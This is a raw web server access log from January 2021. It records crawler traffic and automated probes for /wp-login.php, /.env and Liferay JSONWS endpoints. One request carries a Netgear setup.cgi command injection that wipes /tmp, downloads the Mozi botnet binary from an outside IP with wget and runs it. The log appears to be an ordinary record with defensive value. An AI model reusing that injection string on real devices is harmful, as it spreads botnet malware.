::ffff:127.0.0.1 - - [12/Jan/2021:00:33:53 +0000] "GET /blog-details/24 HTTP/1.1" 200 32407 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.90 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [12/Jan/2021:00:56:58 +0000] "GET /wp-login.php HTTP/1.1" 404 151 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
::ffff:127.0.0.1 - - [12/Jan/2021:01:03:37 +0000] "GET /resource/4 HTTP/1.1" 200 33822 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.90 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:127.0.0.1 - - [12/Jan/2021:01:14:02 +0000] "GET / HTTP/1.1" 200 63275 "-" "-"
::ffff:127.0.0.1 - - [12/Jan/2021:01:14:54 +0000] "GET / HTTP/1.1" 200 63275 "-" "-"
::ffff:127.0.0.1 - - [12/Jan/2021:01:17:24 +0000] "GET /version HTTP/1.1" 404 146 "-" "Python-urllib/1.17"
::ffff:127.0.0.1 - test@liferay.com [12/Jan/2021:01:17:54 +0000] "POST /api/jsonws/expandocolumn/update-column HTTP/1.1" 400 1055 "-" "Python-urllib/2.7"
::ffff:127.0.0.1 - test@liferay.com [12/Jan/2021:01:18:07 +0000] "POST /zend3/public/ HTTP/1.1" 400 1055 "-" "Python-urllib/2.7"
::ffff:127.0.0.1 - - [12/Jan/2021:01:22:13 +0000] "GET / HTTP/1.1" 200 63275 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:127.0.0.1 - - [12/Jan/2021:01:36:15 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot-BA; +http://www.semrush.com/bot.html)"
::ffff:127.0.0.1 - - [12/Jan/2021:01:36:59 +0000] "GET /carrier-info HTTP/1.1" 200 223658 "-" "Mozilla/5.0 (compatible; SemrushBot-BA; +http://www.semrush.com/bot.html)"
::ffff:127.0.0.1 - - [12/Jan/2021:01:45:00 +0000] "GET / HTTP/1.1" 200 63275 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
::ffff:127.0.0.1 - - [12/Jan/2021:02:04:50 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [12/Jan/2021:02:04:51 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [12/Jan/2021:02:07:29 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot-BA; +http://www.semrush.com/bot.html)"
::ffff:127.0.0.1 - - [12/Jan/2021:02:07:59 +0000] "GET /carrier-info HTTP/1.1" 200 223658 "-" "Mozilla/5.0 (compatible; SemrushBot-BA; +http://www.semrush.com/bot.html)"
::ffff:127.0.0.1 - - [12/Jan/2021:02:14:23 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://101.0.49.217:39270/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.1" 404 148 "-" "-"
::ffff:209.17.96.50 - - [12/Jan/2021:02:47:05 +0000] "GET / HTTP/1.1" 200 63275 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
::ffff:127.0.0.1 - - [12/Jan/2021:03:03:34 +0000] "GET / HTTP/1.1" 200 63275 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
